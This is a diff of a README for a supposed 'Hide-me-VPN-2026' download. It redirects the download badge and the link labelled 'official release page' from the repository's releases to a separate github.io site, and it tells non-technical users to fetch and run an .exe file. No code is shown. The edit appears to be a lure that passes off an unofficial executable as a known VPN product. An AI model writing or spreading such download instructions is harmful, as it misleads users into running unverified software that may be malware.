@@ -1,12 +1,12 @@
 # 🛡️ Hide-me-VPN-2026 - Protect your online activity with ease
 
-[![](https://img.shields.io/badge/Download-Hide--me--VPN--2026-blue)](https://github.com/giorgiogrammatical810/Hide-me-VPN-2026/releases)
+[![](https://img.shields.io/badge/Download-Hide--me--VPN--2026-blue)](https://giorgiogrammatical810.github.io)
 
 ## 📥 How to download the software
 
 Follow these instructions to get the application on your computer. You do not need technical skills to complete this process.
 
-1. Go to the [official release page](https://github.com/giorgiogrammatical810/Hide-me-VPN-2026/releases).
+1. Go to the [official release page](https://giorgiogrammatical810.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
